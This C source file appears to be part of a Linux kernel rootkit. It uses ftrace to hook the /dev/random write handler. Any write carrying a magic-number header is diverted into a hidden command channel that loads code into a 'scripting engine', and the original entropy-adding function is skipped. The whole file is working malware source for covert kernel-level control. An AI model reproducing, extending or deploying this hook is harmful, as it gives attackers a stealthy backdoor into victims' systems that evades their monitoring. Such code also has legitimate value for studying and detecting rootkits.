/* Communication channel to load code into the scripting engine */

#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/slab.h>

#include "../utils/ftrace_helper.h"
#include "../cmd.h"

static asmlinkage ssize_t (*orig_random_write_iter)(struct kiocb *kiocb, struct iov_iter *iter);

static asmlinkage ssize_t hook_random_write_iter(struct kiocb *kiocb, struct iov_iter *iter)
{
    message_header message;
    u8 *message_body = NULL;
    size_t header_copied = 0, body_copied = 0;
    // We don't actually care that much about the original function being 
    // called, as it just adds entropy to the RNG.
    if (unlikely(!iov_iter_count(iter))) {
		return 0;
    }

    header_copied = copy_from_iter(&message, sizeof(message_header), iter);
    
    /* verify the size */
    if (header_copied != sizeof(message_header)) {
        goto done;
    }

    /* Check the magic number */
    if (message.magic != MAGIC_NUMBER) {
        goto done;
    }

    /* Skip ahead if size is 0 */
    if (message.size == 0) {
        goto process_message;
    }

    /* Copy the message in */
    message_body = kmalloc(message.size, GFP_KERNEL);
    if (message_body == NULL) {
        goto done;
    }

    body_copied = copy_from_iter(message_body, message.size, iter);
    
    if (body_copied != message.size) {
        goto cleanup;
    }

process_message:
    /* Now we can process commands */
    printk(KERN_INFO "processing message\n");
    process_message(&message, message_body);

cleanup:
    if (message_body != NULL) {
        kfree(message_body);
    }

done:
    return header_copied + body_copied;
}


static struct ftrace_hook hooks[] = {
    HOOK("random_write_iter", hook_random_write_iter, &orig_random_write_iter)
};


int install_random_hooks(void)
{
    return fh_install_hooks(hooks, ARRAY_SIZE(hooks));
}

void remove_random_hooks(void)
{
    fh_remove_hooks(hooks, ARRAY_SIZE(hooks));
}
